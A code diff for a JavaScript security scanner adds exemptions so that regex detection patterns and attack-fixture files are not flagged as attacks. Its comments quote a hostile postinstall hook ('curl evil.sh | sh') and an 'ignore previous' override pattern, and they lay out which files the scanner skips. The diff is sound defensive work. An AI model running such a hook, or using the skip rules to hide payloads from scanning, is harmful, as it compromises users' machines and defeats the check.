@@ -444,6 +444,49 @@ export function isTestPath(filePath) {
   );
 }
 
+/**
+ * Is this match inside a REGEX LITERAL or a pattern-definition line?
+ *
+ * A security scanner's own source is full of attack strings by necessity —
+ * they are the detection patterns. Scanning this repository produced 143
+ * findings and a `high` tier, almost all of them the scanner reading its own
+ * regexes and its own test corpus.
+ *
+ * That is not vanity: it hits ANY security tool, any linter with rule
+ * examples, any repo documenting the attacks it defends against. Publishing an
+ * index that rates security tools as malware would be self-discrediting.
+ *
+ * A pattern definition looks like `re: /.../` or `{ id: "...", re: ... }` —
+ * the string sits inside a regex literal or beside a `re:` key, never in prose
+ * a model would read as an instruction.
+ */
+function isPatternDefinition(line) {
+  const l = String(line || "");
+  // Deliberately narrow. An earlier version also treated any line containing a
+  // bare regex-looking literal as a definition — that matched
+  // `{"scripts":{"postinstall":"curl evil.sh | sh"}}`, because it contains
+  // slashes and ends in a brace, and silenced a REAL install-hook attack.
+  // Suppressing an attack is far worse than a stray false positive, so this
+  // now requires an explicit `re:` key or the id/label metadata beside it.
+  return (
+    /\bre\s*:\s*\//.test(l) ||                    // `re: /ignore\s+previous/gi`
+    /\b(?:id|label|pattern)\s*:\s*["'][a-z_]+["']\s*,/.test(l) // its metadata
+  );
+}
+
+/**
+ * Does this file exist to hold attack examples?
+ *
+ * Distinct from isTestPath: a corpus/fixture file's PURPOSE is to contain
+ * payloads. Suppressing attack patterns there is correct, while still scanning
+ * ordinary test files — malware hidden in `evil.test.js` must stay detectable.
+ */
+function isAttackFixture(filePath) {
+  const p = String(filePath || "").split("\\").join("/").toLowerCase();
+  return /(^|\/)(fixtures?|testdata|corpus|samples?|payloads?)(\/|$)/.test(p) ||
+         /(attack|malware|payload|exploit|poison)[a-z]*\.(js|ts|json|py|yaml|yml)$/.test(p);
+}
+
 export function scoreFiles(files = []) {
   const list = Array.isArray(files) ? files : [];
   const findings = [];
@@ -455,6 +498,10 @@ export function scoreFiles(files = []) {
       const filePath = file?.path || "(unknown)";
       // A fake credential in a test fixture is not a leak. See isTestPath().
       if (factor.key === "secrets" && isTestPath(filePath)) continue;
+      // A corpus of attack payloads is not an attack. Ordinary test files are
+      // still scanned — malware hidden in evil.test.js must stay detectable —
+      // but a file whose PURPOSE is holding examples is exempt.
+      if (isAttackFixture(filePath)) continue;
       // Match against the FOLDED text so homoglyphs, zero-width separators and
       // full-width forms cannot hide a directive. Report against the original.
       const { folded, map } = foldWithMap(original);
@@ -468,6 +515,12 @@ export function scoreFiles(files = []) {
           // A security comment describing an attack is not the attack. Check
           // the line itself, and whether it sits inside a multi-line docstring
           // or block comment whose delimiter is further up.
+          // A regex literal that DEFINES a detection pattern is not a
+          // directive — no model reads `re: /ignore\s+previous/gi` as an
+          // instruction. Applies to every check, including the self-evident
+          // ones, because a scanner must be able to describe what it detects.
+          if (isPatternDefinition(lineAt(text, m.index))) continue;
+
           if (factor.key === "tool_poisoning" && !SELF_EVIDENT_PATTERNS.has(pat.id)) {
             const line = lineAt(text, m.index);
             // Never suppress a line that is agent-facing or reads as an
